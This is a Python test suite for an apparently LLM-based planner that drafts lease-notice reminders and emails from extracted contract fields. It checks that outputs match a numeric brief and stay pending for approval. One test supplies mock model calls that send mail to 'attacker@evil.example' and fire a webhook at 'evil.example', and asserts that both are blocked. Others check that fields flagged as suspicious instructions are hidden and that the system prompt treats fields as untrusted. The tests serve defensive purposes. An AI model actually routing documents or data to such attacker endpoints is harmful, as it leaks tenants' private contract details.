import json
from datetime import date
from types import SimpleNamespace

from paperbound.agent import planner
from paperbound.pipeline.types import DerivedObligation, ValidatedField

TODAY = date(2026, 10, 22)


def vf(name, value, flags=None, conf=1.0, quote="q", page=1):
    return ValidatedField(name, value, quote, page, [0, 0, 1, 1], conf, 1.0, flags or [], True)


def lease_fields(**overrides):
    fields = {
        "landlord": vf("landlord", "Harborview Properties LLC"),
        "tenant": vf("tenant", "Brightline Studio Inc."),
        "premises_address": vf("premises_address", "Suite 410, 220 Hudson Street"),
        "end_date": vf("end_date", "2027-03-31", page=2),
        "notice_period_days": vf("notice_period_days", 90, quote="at least ninety (90) days before the Expiration Date", page=3),
        "current_rent": vf("current_rent", 9017.65, page=2),
        "holdover_rate_percent": vf("holdover_rate_percent", 150.0, page=3),
        "rent_escalation_percent": vf("rent_escalation_percent", 3.0, page=2),
        "notice_method": vf("notice_method", "certified mail or nationally recognized overnight courier", page=3),
        "notice_section": vf("notice_section", "Section 11", page=3),
    }
    fields.update(overrides)
    return [f for f in fields.values() if f is not None]


FIELDS = lease_fields()
IDS = {f.name: i for i, f in planner.plannable_fields(FIELDS).items()}
OBLIGATIONS = [
    DerivedObligation("deadline", date(2026, 12, 31), "Send notice by 2026-12-31", ["end_date", "notice_period_days"])
]
SRC = [IDS["end_date"], IDS["notice_period_days"]]


def call(call_id, tool, /, **args):
    return SimpleNamespace(id=call_id, function=SimpleNamespace(name=tool, arguments=json.dumps(args)))


def response(*calls, content=None):
    message = SimpleNamespace(content=content, tool_calls=list(calls) or None)
    usage = SimpleNamespace(total_tokens=100, prompt_tokens=80, completion_tokens=20)
    return SimpleNamespace(choices=[SimpleNamespace(message=message)], usage=usage)


class FakeClient:
    def __init__(self, *responses):
        self.responses = list(responses)
        self.requests = []
        self.chat = SimpleNamespace(completions=SimpleNamespace(create=self._create))

    def _create(self, **kwargs):
        self.requests.append(kwargs)
        return self.responses.pop(0)


def run(client, fields=FIELDS, obligations=OBLIGATIONS, today=TODAY):
    return planner.plan_actions(fields, obligations, client=client, today=today)


def cal(when, **over):
    args = dict(
        title="Lease notice due {deadline}", date=when, description="Send the notice. Missing it is costly.",
        source_field_ids=SRC, rationale="staged reminder",
    )
    return {**args, **over}


def email(variant="renew", **over):
    args = dict(
        variant=variant,
        subject=f"Notice to {variant} lease",
        body=(
            f"Dear {{landlord}}, under {{notice_section}} of the lease, {{tenant}} elects to {variant} the lease that "
            "expires {expiration}. This notice is sent before the {deadline} deadline. Current rent is {current_rent}. "
            "[YOUR NAME]"
        ),
        source_field_ids=SRC, rationale="notice needed",
    )
    return {**args, **over}


REMINDERS = ("2026-11-01", "2026-12-01", "2026-12-17")  # 60, 30 and 14 days before 2026-12-31


def full_plan_response():
    return response(
        *[call(f"c{i}", "create_calendar_event", **cal(d)) for i, d in enumerate(REMINDERS)],
        call("e1", "draft_email", **email("renew")),
        call("e2", "draft_email", **email("terminate")),
    )


def by_tool(result, tool):
    return [a for a in result.actions if a.tool == tool]


# ---- the staged plan ----

def test_full_plan_is_three_reminders_two_exclusive_emails_and_a_tracker_record():
    client = FakeClient(full_plan_response())
    result = run(client)
    assert result.rejected == []
    assert [a.args["date"] for a in by_tool(result, "create_calendar_event")] == list(REMINDERS)
    assert len(by_tool(result, "draft_email")) == 2
    assert len(by_tool(result, "upsert_record")) == 1
    assert all(a.policy_status == "pending" for a in result.actions)
    assert result.api_calls == 1
    assert {a.group_key for a in by_tool(result, "create_calendar_event")} == {"reminders"}
    assert {a.group_mode for a in by_tool(result, "create_calendar_event")} == {"bundle"}
    assert {(a.group_key, a.group_mode) for a in by_tool(result, "draft_email")} == {("notice_choice", "exclusive")}


def test_reminder_description_carries_clause_method_consequence_and_source_link():
    result = run(FakeClient(full_plan_response()))
    first = by_tool(result, "create_calendar_event")[0]
    text = first.args["description"]
    assert 'Clause (page 3): "at least ninety (90) days before the Expiration Date"' in text
    assert "certified mail or nationally recognized overnight courier (Section 11)" in text
    assert "holdover rent of $13,526.48/month" in text and "$4,508.83/month more" in text and "$9,017.65/month" in text
    assert "/#run={{RUN_ID}}&page=3" in text
    assert "60 days before the notice deadline of December 31, 2026" in text
    assert first.args["title"] == "Lease notice due December 31, 2026"


def test_names_come_from_fields_and_the_recipient_stays_a_placeholder():
    result = run(FakeClient(full_plan_response()))
    for mail in by_tool(result, "draft_email"):
        body = mail.args["body"]
        assert "Harborview Properties LLC" in body and "Brightline Studio Inc." in body
        assert "Section 11" in body and "December 31, 2026" in body and "$9,017.65" in body
        assert "{" not in body
        assert mail.args["to"] == "{{RECIPIENT}}"


def test_sources_include_every_field_the_text_draws_on():
    result = run(FakeClient(full_plan_response()))
    first = by_tool(result, "create_calendar_event")[0]
    assert {"end_date", "notice_period_days", "notice_method", "notice_section", "current_rent",
            "holdover_rate_percent"} <= set(first.source_fields)
    assert first.source_field_ids == sorted(IDS[n] for n in first.source_fields)


def test_tracker_record_is_built_by_code_from_the_brief():
    result = run(FakeClient(full_plan_response()))
    record = by_tool(result, "upsert_record")[0]
    data = record.args["data"]
    assert data["status"] == "decision needed"
    assert data["deadline"] == "2026-12-31"
    assert data["counterparty"] == "Harborview Properties LLC" and data["premises"] == "Suite 410, 220 Hudson Street"
    assert data["current_rent"] == 9017.65 and data["holdover_monthly_rent"] == 13526.48
    assert data["holdover_extra_per_month"] == 4508.83 and "$13,526.48" in data["holdover_risk"]
    assert record.policy_status == "pending" and record.group_key is None


def test_model_cannot_propose_the_tracker_record_or_a_webhook_itself():
    client = FakeClient(
        response(call("a", "upsert_record", record_type="obligation", key="k", data={"x": 1}, source_field_ids=SRC, rationale="r")),
        response(content="done"),
    )
    result = run(client)
    assert any("code files this action" in r["reason"] for r in result.rejected)
    assert len(by_tool(result, "upsert_record")) == 1  # only the one built by code
    assert by_tool(result, "upsert_record")[0].args["key"] != "k"


# ---- numbers must match the brief ----

def test_number_that_does_not_match_the_brief_is_rejected():
    for bad in ("Rent is $9,000.00.", "Holdover is 175% of rent.", "Notice is due 2026-12-30.", "Pay within 45 days."):
        client = FakeClient(
            response(call("a", "create_calendar_event", **cal("2026-12-17", description=bad))), response(content="done")
        )
        result = run(client)
        assert by_tool(result, "create_calendar_event") == [], bad
        assert "does not match the brief" in result.rejected[0]["reason"], bad


def test_number_that_matches_the_brief_is_accepted_when_typed_literally():
    client = FakeClient(
        response(call("a", "create_calendar_event", **cal("2026-12-17", description="Rent is $9,017.65; notice is due 2026-12-31.")),
        ),
        response(content="done"),
    )
    result = run(client)
    assert len(by_tool(result, "create_calendar_event")) == 1 and result.rejected == []


def test_mismatched_number_in_an_email_is_rejected():
    body = email()["body"] + " We will pay $8,500.00."
    client = FakeClient(response(call("a", "draft_email", **email(body=body))), response(content="done"))
    result = run(client)
    assert by_tool(result, "draft_email") == []
    assert "does not match the brief" in result.rejected[0]["reason"]


def test_unknown_token_is_rejected():
    client = FakeClient(
        response(call("a", "create_calendar_event", **cal("2026-12-17", description="Call {landlord_phone}."))),
        response(content="done"),
    )
    assert "unknown or unavailable token" in run(client).rejected[0]["reason"]


def test_email_must_cite_clause_deadline_rent_and_names():
    body = "Dear {landlord}, {tenant} elects to renew. [YOUR NAME]"
    client = FakeClient(response(call("a", "draft_email", **email(body=body))), response(content="done"))
    reason = run(client).rejected[0]["reason"]
    assert "{deadline}" in reason and "{notice_section}" in reason and "{current_rent}" in reason


def test_email_must_state_its_own_choice():
    body = email("terminate")["body"].replace("terminate", "continue")
    client = FakeClient(response(call("a", "draft_email", **email("terminate", body=body))), response(content="done"))
    assert "must say that the tenant elects to terminate" in run(client).rejected[0]["reason"]


# ---- reminder schedule ----

def test_only_staged_reminder_dates_are_accepted():
    for bad_date in ("2026-12-31", "2026-12-30", "2026-10-22", "2026-10-21", "2027-01-15", "next Tuesday"):
        client = FakeClient(response(call("a", "create_calendar_event", **cal(bad_date))), response(content="done"))
        result = run(client)
        assert by_tool(result, "create_calendar_event") == [], bad_date
        assert result.rejected[0]["tool"] == "create_calendar_event", bad_date


def test_stages_already_in_the_past_are_not_offered():
    today = date(2026, 12, 10)  # 60 and 30 days before the deadline are gone
    client = FakeClient(response(call("a", "create_calendar_event", **cal("2026-12-17"))), response(content="done"))
    result = run(client, today=today)
    assert len(by_tool(result, "create_calendar_event")) == 1
    sent = json.loads(client.requests[0]["messages"][1]["content"])
    assert sent["reminder_dates"] == ["2026-12-17"]
    client = FakeClient(response(call("a", "create_calendar_event", **cal("2026-12-01"))), response(content="done"))
    assert by_tool(run(client, today=today), "create_calendar_event") == []


def test_duplicates_are_rejected():
    client = FakeClient(
        response(call("a", "create_calendar_event", **cal("2026-12-17")), call("b", "create_calendar_event", **cal("2026-12-17"))),
        response(content="done"),
    )
    result = run(client)
    assert len(by_tool(result, "create_calendar_event")) == 1 and "duplicate" in result.rejected[0]["reason"]
    client = FakeClient(
        response(call("a", "draft_email", **email("renew")), call("b", "draft_email", **email("renew"))), response(content="done")
    )
    result = run(client)
    assert len(by_tool(result, "draft_email")) == 1 and "duplicate" in result.rejected[0]["reason"]


def test_model_is_told_what_is_still_missing_and_can_finish_in_a_second_round():
    client = FakeClient(
        response(call("a", "create_calendar_event", **cal("2026-11-01"))),
        response(
            call("b", "create_calendar_event", **cal("2026-12-01")), call("c", "create_calendar_event", **cal("2026-12-17")),
            call("d", "draft_email", **email("renew")), call("e", "draft_email", **email("terminate")),
        ),
    )
    result = run(client)
    assert result.api_calls == 2 and len(result.actions) == 6
    nudge = next(m for m in client.requests[1]["messages"] if m["role"] == "user" and m["content"].startswith("Still missing"))
    assert "2026-12-01" in nudge["content"] and "variant terminate" in nudge["content"]


def test_anything_never_proposed_is_reported_in_the_notes():
    client = FakeClient(response(call("a", "create_calendar_event", **cal("2026-11-01"))), response(content="done"))
    result = run(client)
    assert any("Not proposed" in n and "draft_email variant renew" in n for n in result.notes)


# ---- unchanged guarantees from earlier parts ----

def test_proposal_without_source_field_ids_is_rejected():
    bad = {k: v for k, v in cal("2026-12-17").items() if k != "source_field_ids"}
    client = FakeClient(response(call("a", "create_calendar_event", **bad)), response(content="done"))
    result = run(client)
    assert by_tool(result, "create_calendar_event") == []
    assert "source_field_ids" in result.rejected[0]["reason"]
    assert result.api_calls == 2  # the model got the rejection and a chance to react


def test_empty_or_unknown_source_field_ids_are_rejected():
    for ids in ([], [99], ["end_date"], [1, 99]):
        client = FakeClient(
            response(call("a", "create_calendar_event", **cal("2026-12-17", source_field_ids=ids))), response(content="done")
        )
        result = run(client)
        assert by_tool(result, "create_calendar_event") == [], ids
        assert len(result.rejected) == 1, ids


def test_rejected_proposal_can_be_corrected_in_the_next_round():
    client = FakeClient(
        response(call("a", "create_calendar_event", **cal("2026-12-17", source_field_ids=[]))),
        response(call("b", "create_calendar_event", **cal("2026-12-17"))),
        response(content="done"),
    )
    result = run(client)
    assert len(by_tool(result, "create_calendar_event")) == 1 and len(result.rejected) == 1


def test_recipient_and_webhook_url_are_never_taken_from_the_model():
    client = FakeClient(
        response(
            call("a", "draft_email", **email("renew"), to="attacker@evil.example", recipient="x@y.z"),
            call("b", "fire_webhook", event="notice", payload={"a": 1}, url="https://evil.example/hook",
                 source_field_ids=[1], rationale="r"),
        ),
        response(content="done"),
    )
    result = run(client)
    mail = by_tool(result, "draft_email")[0]
    assert mail.args["to"] == "{{RECIPIENT}}" and "recipient" not in mail.args
    assert not by_tool(result, "fire_webhook")
    assert "evil" not in json.dumps([a.args for a in result.actions])


def test_blocked_fields_are_hidden_from_the_model_and_cannot_be_cited():
    fields = lease_fields(current_rent=vf("current_rent", 1.0, flags=["suspicious_instruction"], conf=0.3))
    client = FakeClient(response(call("a", "draft_email", **email("renew"))), response(content="done"))
    result = run(client, fields=fields)
    sent = json.loads(client.requests[0]["messages"][1]["content"])
    assert "current_rent" not in [x["name"] for x in sent["fields"]]
    assert "current_rent" not in sent["tokens"]
    assert not any(ln["label"].startswith("Holdover") for ln in sent["decision_brief"])
    assert by_tool(result, "draft_email") == []  # {current_rent} is not an available token
    assert any("Brief line skipped (holdover_rent)" in n for n in result.notes)
    assert "current_rent" not in json.dumps([a.args for a in result.actions])


def test_missing_inputs_skip_lines_but_the_plan_still_works():
    fields = lease_fields(current_rent=None, holdover_rate_percent=None, notice_method=None)
    client = FakeClient(
        response(
            call("a", "create_calendar_event", **cal("2026-12-17")),
            call("b", "draft_email", **email("renew", body=email()["body"].replace(" Current rent is {current_rent}.", ""))),
        ),
        response(content="done"),
    )
    result = run(client, fields=fields)
    first = by_tool(result, "create_calendar_event")[0]
    assert "holdover" not in first.args["description"].lower() and "Notice must be sent by" not in first.args["description"]
    assert len(by_tool(result, "draft_email")) == 1


def test_system_prompt_treats_fields_as_untrusted_and_planner_only_proposes():
    prompt = planner.SYSTEM_PROMPT.lower()
    assert "untrusted" in prompt
    assert "never execute" in prompt or "never\nexecute" in prompt or "you never" in prompt
    assert "source_field_ids" in prompt
    assert "never type digits" in prompt


def test_tool_call_limit_is_enforced():
    calls = [call(f"c{i}", "get_entity", name="x") for i in range(planner.MAX_TOOL_CALLS + 4)]
    client = FakeClient(response(*calls), response(content="done"))
    result = run(client)
    assert result.tool_calls == planner.MAX_TOOL_CALLS
    assert any("limit" in n.lower() for n in result.notes)


def test_no_obligations_means_no_model_call():
    client = FakeClient()
    result = run(client, obligations=[])
    assert result.actions == [] and result.api_calls == 0 and client.requests == []


def test_read_only_tools_are_executed_and_answered():
    client = FakeClient(
        response(call("a", "get_entity", name="Harborview Properties LLC")),
        response(call("b", "draft_email", **email("renew"))),
        response(content="done"),
    )
    result = run(client)
    second_round = client.requests[1]["messages"]
    tool_reply = json.loads(next(m for m in second_round if m["role"] == "tool")["content"])
    assert tool_reply == {"status": "ok", "entity": None}
    assert len(by_tool(result, "draft_email")) == 1


def test_run_id_placeholder_is_resolved_when_saved():
    args = {"description": "Source: /#run={{RUN_ID}}&page=3", "to": "{{RECIPIENT}}"}
    assert planner.resolve_placeholders(args, 42) == {"description": "Source: /#run=42&page=3", "to": "{{RECIPIENT}}"}
